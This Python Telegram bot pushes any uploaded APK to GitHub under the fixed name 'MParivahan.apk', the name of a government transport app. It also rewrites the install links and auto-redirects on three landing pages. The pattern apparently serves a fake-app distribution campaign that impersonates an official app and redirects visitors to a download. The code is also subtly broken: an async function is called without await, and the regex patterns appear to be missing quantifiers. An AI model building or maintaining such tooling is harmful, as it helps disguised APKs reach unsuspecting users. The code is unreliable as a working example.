import os
import logging
import base64
import asyncio
import re
from urllib.parse import urlparse

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    MessageHandler,
    CommandHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ============================================================
# CONFIG
# ============================================================

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
GITHUB_REPO = 'nikkiwebs/Upload'
GITHUB_BRANCH = os.environ.get('GITHUB_BRANCH', 'main')

# Existing APK behavior
FIXED_FILE_NAME = 'MParivahan.apk'

# New HTML behavior
HTML_FILE_NAME = 'index.html'
HTML_GITHUB_REPO = 'ilanding/inde'
HTML_REPOS = {
    'index': 'ilanding/inde',
    'index2': 'ilanding/inde2',
    'index3': 'ilanding/inde3',
}

# Optional: restrict the bot to specific Telegram user IDs.
# Example Railway variable:
# ALLOWED_USER_IDS=123456789,987654321
ALLOWED_USER_IDS_RAW = os.environ.get('ALLOWED_USER_IDS', '').strip()


# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


# ============================================================
# VALIDATION / AUTH
# ============================================================

def get_allowed_user_ids():
    if not ALLOWED_USER_IDS_RAW:
        return set()

    result = set()
    for value in ALLOWED_USER_IDS_RAW.split(','):
        value = value.strip()
        if value.isdigit():
            result.add(int(value))
    return result


ALLOWED_USER_IDS = get_allowed_user_ids()


def is_authorized(update: Update) -> bool:
    '\n    If ALLOWED_USER_IDS is empty, all users are allowed.\n    If configured, only listed Telegram user IDs can use the bot.\n    '
    if not ALLOWED_USER_IDS:
        return True

    user = update.effective_user
    return bool(user and user.id in ALLOWED_USER_IDS)


async def ensure_authorized(update: Update) -> bool:
    if is_authorized(update):
        return True

    if update.callback_query:
        await update.callback_query.answer(
            '❌ You are not authorized to use this bot.',
            show_alert=True,
        )
    elif update.effective_message:
        await update.effective_message.reply_text(
            '❌ You are not authorized to use this bot.'
        )

    return False


# ============================================================
# GITHUB HELPERS
# ============================================================

def github_headers():
    return {
        'Authorization': f"token {GITHUB_TOKEN}",
        'Accept': 'application/vnd.github.v3+json',
        'X-GitHub-Api-Version': '2022-11-28',
    }


def github_file_api_url(file_path: str, repo=None):
    repo = repo or GITHUB_REPO
    return f"https://api.github.com/repos/{repo}/contents/{file_path}"


def get_github_file(file_path: str, repo=None):
    '\n    Returns:\n        {\n            "sha": "...",\n            "content": bytes,\n            "path": "...",\n            ...\n        }\n    or None if the file does not exist.\n    '
    response = requests.get(
        github_file_api_url(file_path, repo),
        headers=github_headers(),
        params={'ref': GITHUB_BRANCH},
        timeout=30,
    )

    if response.status_code == 200:
        data = response.json()

        encoded = data.get('content', '')
        if encoded:
            encoded = encoded.replace('\n', '')
            content = base64.b64decode(encoded)
        else:
            content = b""

        return {
            'sha': data.get('sha'),
            'content': content,
            'path': data.get('path'),
            'size': data.get('size', len(content)),
        }

    if response.status_code == 404:
        return None

    raise RuntimeError(
        f"GitHub GET failed ({response.status_code}): {response.text[:500]}"
    )


def get_github_file_sha(file_path: str, repo=None):
    file_data = get_github_file(file_path, repo)
    return file_data['sha'] if file_data else None


def upload_to_github(
    file_path: str,
    file_content: bytes,
    commit_message: str,
    repo=None,
):
    '\n    Create or update a file in GitHub.\n\n    Returns:\n        success, is_update, response_data\n    '
    encoded_content = base64.b64encode(file_content).decode('utf-8')

    data = {
        'message': commit_message,
        'content': encoded_content,
        'branch': GITHUB_BRANCH,
    }

    existing_sha = get_github_file_sha(file_path, repo)
    is_update = existing_sha is not None

    if is_update:
        data['sha'] = existing_sha

    response = requests.put(
        github_file_api_url(file_path, repo),
        headers=github_headers(),
        json=data,
        timeout=60,
    )

    success = response.status_code in (200, 201)

    try:
        response_data = response.json()
    except Exception:
        response_data = {}

    return success, is_update, response_data


# ============================================================
# URL HELPERS
# ============================================================

def validate_url(value: str) -> bool:
    '\n    Accept normal HTTP/HTTPS URLs only.\n    '
    try:
        parsed = urlparse(value.strip())
        return (
            parsed.scheme in ('http', 'https')
            and bool(parsed.netloc)
        )
    except Exception:
        return False


def update_install_url(html: str, new_url: str):
    'Update both the download button URL and the automatic redirect URL.'
    changed_button = False
    changed_redirect = False

    # Update the download/install button href.
    button_patterns = [
        '(<a\\b[^>]\\bhref\\s=\\s[\\"\\\'])[^\\"\\\']([\\"\\\'])',
    ]
    for pattern in button_patterns:
        html, count = re.subn(
            pattern,
            lambda m: m.group(1) + new_url + m.group(2),
            html,
            count=1,
            flags=re.IGNORECASE | re.DOTALL,
        )
        if count:
            changed_button = True
            break

    # Update window.location.replace(...) redirect URL wherever it exists.
    redirect_patterns = [
        '(window\\.location\\.replace\\(\\s[\\"\\\'])[^\\"\\\']([\\"\\\']\\s\\))',
        '(window\\.location\\.href\\s=\\s[\\"\\\'])[^\\"\\\']([\\"\\\'])',
    ]
    for pattern in redirect_patterns:
        html, count = re.subn(
            pattern,
            lambda m: m.group(1) + new_url + m.group(2),
            html,
            count=1,
            flags=re.IGNORECASE | re.DOTALL,
        )
        if count:
            changed_redirect = True
            break

    # If both elements are present, both must be updated. This prevents
    # reporting success when only one URL was changed.
    return html, changed_button and changed_redirect


def html_repo_keyboard():
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton('1️⃣ ilanding/inde', callback_data='select_repo:index')],
            [InlineKeyboardButton('2️⃣ ilanding/inde2', callback_data='select_repo:index2')],
            [InlineKeyboardButton('3️⃣ ilanding/inde3', callback_data='select_repo:index3')],
            [InlineKeyboardButton('❌ Cancel', callback_data='cancel_url_change')],
        ]
    )


def main_keyboard():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton('📦 Upload APK', callback_data='upload_apk'),
            ],
            [
                InlineKeyboardButton('📊 Status', callback_data='status'),
            ],
        ]
    )


# ============================================================
# /start
# ============================================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_authorized(update):
        return

    context.user_data.pop('waiting_for_url', None)

    user = update.effective_user

    await update.message.reply_text(
        f"👋 Hello {user.first_name}!\n\n"
        f"I am your APK Upload Bot 🤖\n\n"
        f"📦 Upload APK\n"
        f"• Send any .apk file\n"
        f"• I will save it on GitHub as {FIXED_FILE_NAME}\n"
        f"• The existing APK will be replaced\n\n"
        f"📦 APK Repository: {GITHUB_REPO}\n"
        f"🌿 Branch: {GITHUB_BRANCH}",
        reply_markup=main_keyboard(),
    )


# ============================================================
# /help
# ============================================================

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_authorized(update):
        return

    await update.message.reply_text(
        '🆘 Help Menu\n\n'
        '📦 Upload APK:\n'
        '1️⃣ .apk file bhejo\n'
        f"2️⃣ Bot usko {FIXED_FILE_NAME} naam se save/update karega\n"
        '3️⃣ Same GitHub path maintain rahega\n\n'
        '🔗 Change URL:\n'
        '1️⃣ Change URL button dabao\n'
        '2️⃣ New https:// ya http:// URL bhejo\n'
        f"3️⃣ Bot {HTML_FILE_NAME} ko GitHub se read karega\n"
        '4️⃣ Sirf Install redirect URL replace karega\n'
        '5️⃣ Updated HTML same file/path par save karega\n\n'
        '📊 /status: GitHub repository aur files ka status check karta hai.',
        reply_markup=main_keyboard(),
    )


# ============================================================
# /status
# ============================================================

async def get_latest_commit(repo: str):
    response = requests.get(
        f"https://api.github.com/repos/{repo}/commits",
        headers=github_headers(),
        params={'sha': GITHUB_BRANCH, 'path': HTML_FILE_NAME if repo != GITHUB_REPO else FIXED_FILE_NAME, 'per_page': 1},
        timeout=30,
    )
    if response.status_code != 200:
        return None, f"GitHub error {response.status_code}"
    commits = response.json()
    if not commits:
        return None, 'No commits found'
    c = commits[0]
    return c, None


def format_commit_details(repo: str, label: str, file_name: str):
    commit, error = get_latest_commit(repo)
    file_data = get_github_file(file_name, repo)
    if error:
        return (
            f"{label}\n"
            f"📂 Repo: {repo}\n"
            f"📄 File: {file_name}\n"
            f"❌ {error}"
        )

    commit_info = commit.get('commit', {})
    author = commit_info.get('author', {})
    date = author.get('date', 'Unknown')
    message = commit_info.get('message', 'Unknown').split('\n', 1)[0]
    sha = commit.get('sha', '')[:7]
    html_size = f"{file_data['size'] / 1024:.1f} KB" if file_data else 'Not found'
    return (
        f"{label}\n"
        f"📂 Repo: {repo}\n"
        f"📄 File: {file_name}\n"
        f"📦 Size: {html_size}\n"
        f"🕐 Last Update: {date}\n"
        f"👤 Author: {author.get('name', 'Unknown')}\n"
        f"📝 Commit: {message[:180]}\n"
        f"🔑 SHA: {sha}"
    )


def build_status_text():
    repo_url = f"https://api.github.com/repos/{GITHUB_REPO}"
    response = requests.get(repo_url, headers=github_headers(), timeout=30)

    if response.status_code != 200:
        return (
            '❌ GitHub Connection Failed!\n\n'
            f"Status Code: {response.status_code}\n"
            'Check your GITHUB_TOKEN and GITHUB_REPO.'
        )

    parts = ['📊 Last Update Status', '']
    parts.append(format_commit_details(GITHUB_REPO, '1️⃣ APK', FIXED_FILE_NAME))
    parts.append('')
    parts.append(format_commit_details(HTML_REPOS['index'], '2️⃣ INDEX', HTML_FILE_NAME))
    parts.append('')
    parts.append(format_commit_details(HTML_REPOS['index2'], '3️⃣ INDEX2', HTML_FILE_NAME))
    parts.append('')
    parts.append(format_commit_details(HTML_REPOS['index3'], '4️⃣ INDEX3', HTML_FILE_NAME))
    return '\n'.join(parts)


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_authorized(update):
        return

    msg = await update.message.reply_text(
        '🔍 Checking GitHub status...'
    )

    try:
        text = await asyncio.to_thread(build_status_text)
        await msg.edit_text(
            text,
            reply_markup=main_keyboard(),
        )
    except Exception as e:
        logger.exception('Status check failed')
        await msg.edit_text(
            '❌ Status Check Failed!\n\n'
            f"Error: {str(e)[:700]}",
            reply_markup=main_keyboard(),
        )


# ============================================================
# CALLBACK BUTTONS
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query

    if not await ensure_authorized(update):
        return

    await query.answer()

    if query.data == 'upload_apk':
        context.user_data.pop('waiting_for_url', None)

        await query.message.reply_text(
            '📦 Upload APK\n\n'
            'Now send an .apk file.\n'
            f"I will upload/replace it on GitHub as {FIXED_FILE_NAME}.",
        )

    elif query.data == 'change_url':
        context.user_data.pop('waiting_for_url', None)
        context.user_data.pop('selected_html_repo', None)

        await query.message.reply_text(
            '🔗 Change URL\n\n'
            "Select which repository's index.html you want to update:",
            reply_markup=html_repo_keyboard(),
        )

    elif query.data.startswith('select_repo:'):
        repo_key = query.data.split(':', 1)[1]
        repo = HTML_REPOS.get(repo_key)
        if not repo:
            await query.message.reply_text('❌ Invalid repository selection.', reply_markup=main_keyboard())
            return

        context.user_data['selected_html_repo'] = repo
        context.user_data['selected_html_repo_key'] = repo_key
        context.user_data['waiting_for_url'] = True

        await query.message.reply_text(
            '🔗 Change URL\n\n'
            f"Selected: {repo}\n\n"
            'Now send the new URL.\n\n'
            'Example:\n'
            'https://example.com/new.apk\n\n'
            '⚠️ Only http:// or https:// URLs are accepted.',
        )

    elif query.data == 'cancel_url_change':
        context.user_data.pop('waiting_for_url', None)
        context.user_data.pop('selected_html_repo', None)
        context.user_data.pop('selected_html_repo_key', None)
        await query.message.reply_text('❌ URL change cancelled.', reply_markup=main_keyboard())

    elif query.data == 'status':
        msg = await query.message.reply_text(
            '🔍 Checking GitHub status...'
        )

        try:
            text = await asyncio.to_thread(build_status_text)
            await msg.edit_text(
                text,
                    reply_markup=main_keyboard(),
            )
        except Exception as e:
            logger.exception('Status callback failed')
            await msg.edit_text(
                '❌ Status Check Failed!\n\n'
                f"Error: {str(e)[:700]}",
                    reply_markup=main_keyboard(),
            )


# ============================================================
# CHANGE URL HANDLER
# ============================================================

async def handle_url_change(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_authorized(update):
        return

    if not context.user_data.get('waiting_for_url'):
        return

    selected_repo = context.user_data.get('selected_html_repo')
    if not selected_repo:
        await update.message.reply_text(
            '❌ Please click Change URL and select a repository first.',
            reply_markup=main_keyboard(),
        )
        return

    new_url = update.message.text.strip()

    if not validate_url(new_url):
        await update.message.reply_text(
            '❌ Invalid URL!\n\n'
            'Valid http:// ya https:// URL bhejo.\n\n'
            'Example:\n'
            'https://example.com/file.apk',
        )
        return

    status_msg = await update.message.reply_text(
        '🔍 Reading index.html from GitHub...',
    )

    try:
        # Fetch index.html from GitHub
        index_data = await asyncio.to_thread(
            get_github_file,
            HTML_FILE_NAME,
            selected_repo,
        )

        if not index_data:
            await status_msg.edit_text(
                f"❌ {HTML_FILE_NAME} was not found in the GitHub repository.\n\n"
                f"Expected path: {HTML_FILE_NAME}\n"
                f"Repo: {selected_repo}\n"
                f"Branch: {GITHUB_BRANCH}",
                    reply_markup=main_keyboard(),
            )
            context.user_data.pop('waiting_for_url', None)
            return

        try:
            html = index_data['content'].decode('utf-8')
        except UnicodeDecodeError:
            await status_msg.edit_text(
                f"❌ {HTML_FILE_NAME} UTF-8 HTML file nahi hai.",
                    reply_markup=main_keyboard(),
            )
            context.user_data.pop('waiting_for_url', None)
            return

        # Replace both the Install button URL and the automatic redirect URL.
        updated_html, changed = update_install_url(html, new_url)

        if not changed:
            await status_msg.edit_text(
                '❌ Both URLs were not found!\n\n'
                'Expected an Install button href and an automatic window.location.replace(...) redirect.\n\n'
                'index.html was not modified.',
                    reply_markup=main_keyboard(),
            )
            context.user_data.pop('waiting_for_url', None)
            return

        await status_msg.edit_text(
            '✏️ Install Button + Redirect URL replaced!\n\n'
            '📤 Uploading the updated index.html to GitHub...',
        )

        # Upload updated HTML to the same path.
        # upload_to_github() fetches the latest SHA before updating,
        # preventing us from using a stale SHA.
        success, is_update, response_data = await asyncio.to_thread(
            upload_to_github,
            HTML_FILE_NAME,
            updated_html.encode('utf-8'),
            'Update Install URL in index.html via Telegram bot',
            selected_repo,
        )

        if not success:
            error_message = (
                response_data.get('message')
                if isinstance(response_data, dict)
                else 'Unknown GitHub error'
            )

            await status_msg.edit_text(
                '❌ index.html Update Failed!\n\n'
                f"GitHub Error: {str(error_message)[:700]}",
                    reply_markup=main_keyboard(),
            )
            context.user_data.pop('waiting_for_url', None)
            return

        context.user_data.pop('waiting_for_url', None)
        context.user_data.pop('selected_html_repo', None)
        context.user_data.pop('selected_html_repo_key', None)

        raw_html_url = (
            f"https://raw.githubusercontent.com/"
            f"{selected_repo}/{GITHUB_BRANCH}/{HTML_FILE_NAME}"
        )

        await status_msg.edit_text(
            '✅ URL Changed Successfully!\n\n'
            f"🔗 New Install URL:\n{new_url}\n\n"
            f"📄 File: {HTML_FILE_NAME}\n"
            f"🌐 HTML Repository: {selected_repo}\n"
            f"🌿 Branch: {GITHUB_BRANCH}\n\n"
            f"🌐 index.html:\n{raw_html_url}",
            reply_markup=main_keyboard(),
        )

    except Exception as e:
        logger.exception('Change URL failed')

        context.user_data.pop('waiting_for_url', None)

        await status_msg.edit_text(
            '❌ Change URL Failed!\n\n'
            f"Error: {str(e)[:1000]}",
            reply_markup=main_keyboard(),
        )


# ============================================================
# APK DOCUMENT HANDLER
# ============================================================

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_authorized(update):
        return

    document = update.message.document
    file_name = document.file_name or ''

    # Only APK allowed
    if not file_name.lower().endswith('.apk'):
        await update.message.reply_text(
            f"❌ Invalid File!\n\n"
            f"{file_name} is not accepted.\n"
            'Only .apk files are accepted! 📦',
            reply_markup=main_keyboard(),
        )
        return

    file_size_mb = round(
        document.file_size / (1024 * 1024),
        2,
    )

    status_msg = await update.message.reply_text(
        f"📥 APK Received!\n\n"
        f"📄 Original Name: {file_name}\n"
        f"🔄 Renaming to: {FIXED_FILE_NAME}\n"
        f"📦 Size: {file_size_mb} MB\n\n"
        '⏳ Downloading from Telegram...',
    )

    # Step 1: Download from Telegram
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = bytes(
            await file.download_as_bytearray()
        )
    except Exception as e:
        logger.exception('Telegram APK download failed')

        await status_msg.edit_text(
            '❌ Download Failed!\n\n'
            'The file could not be downloaded from Telegram.\n'
            f"Error: {str(e)[:700]}",
            reply_markup=main_keyboard(),
        )
        return

    # Step 2: Upload/replace GitHub APK
    await status_msg.edit_text(
        f"📤 Uploading to GitHub...\n\n"
        f"📄 File: {FIXED_FILE_NAME}\n"
        f"📦 Size: {file_size_mb} MB\n"
        f"📂 Repo: {GITHUB_REPO}\n"
        f"🌿 Branch: {GITHUB_BRANCH}\n\n"
        '⏳ Please wait...',
    )

    try:
        commit_msg = (
            f"Update {FIXED_FILE_NAME} via Telegram bot "
            f"(original: {file_name})"
        )

        success, is_update, response_data = await asyncio.to_thread(
            upload_to_github,
            FIXED_FILE_NAME,
            file_content,
            commit_msg,
        )

    except Exception as e:
        logger.exception('GitHub APK upload failed')

        await status_msg.edit_text(
            '❌ Upload Failed!\n\n'
            'The file could not be uploaded to GitHub.\n'
            f"Error: {str(e)[:1000]}",
            reply_markup=main_keyboard(),
        )
        return

    if success:
        download_url = (
            f"https://raw.githubusercontent.com/"
            f"{GITHUB_REPO}/{GITHUB_BRANCH}/{FIXED_FILE_NAME}"
        )

        action = '🔄 Updated' if is_update else '🆕 Uploaded'

        await status_msg.edit_text(
            f"✅ {action} Successfully!\n\n"
            f"📄 Saved As: {FIXED_FILE_NAME}\n"
            f"📦 Size: {file_size_mb} MB\n"
            
            f"🌿 Branch: {GITHUB_BRANCH}\n\n"
            '📥 Direct Download Link:\n'
            f"{download_url}",
            reply_markup=main_keyboard(),
        )

    else:
        error_message = (
            response_data.get('message')
            if isinstance(response_data, dict)
            else 'Unknown GitHub error'
        )

        await status_msg.edit_text(
            '❌ GitHub Upload Failed!\n\n'
            f"Error: {str(error_message)[:700]}\n\n"
            'Possible reasons:\n'
            '• GITHUB_TOKEN invalid/expired\n'
            f"• Repo {GITHUB_REPO} does not exist\n"
            '• GitHub Contents API file-size limitation\n'
            '• Branch/path conflict',
            reply_markup=main_keyboard(),
        )


# ============================================================
# ANY OTHER TEXT
# ============================================================

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_authorized(update):
        return

    # If waiting for URL, process it here.
    if context.user_data.get('waiting_for_url'):
        await handle_url_change(update, context)
        return

    await update.message.reply_text(
        '📁 Send an .apk file or select an option below.',
        reply_markup=main_keyboard(),
    )


# ============================================================
# MAIN
# ============================================================

def main():
    if not TELEGRAM_BOT_TOKEN:
        raise RuntimeError('TELEGRAM_BOT_TOKEN is not set')

    if not GITHUB_TOKEN:
        raise RuntimeError('GITHUB_TOKEN is not set')

    if not HTML_GITHUB_REPO:
        raise RuntimeError('HTML_GITHUB_REPO is not set')

    app = Application.builder().token(
        TELEGRAM_BOT_TOKEN
    ).build()

    app.add_handler(
        CommandHandler('start', cmd_start)
    )
    app.add_handler(
        CommandHandler('help', cmd_help)
    )
    app.add_handler(
        CommandHandler('status', cmd_status)
    )

    app.add_handler(
        CallbackQueryHandler(button_callback)
    )

    # APK documents
    app.add_handler(
        MessageHandler(
            filters.Document.ALL,
            handle_document,
        )
    )

    # Text, including Change URL input
    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            handle_text,
        )
    )

    logger.info(
        'Bot started | apk_repo=%s | html_repo=%s | branch=%s | apk=%s | html=%s',
        GITHUB_REPO,
        HTML_GITHUB_REPO,
        GITHUB_BRANCH,
        FIXED_FILE_NAME,
        HTML_FILE_NAME,
    )

    app.run_polling(
        drop_pending_updates=True
    )


if __name__ == '__main__':
    main()
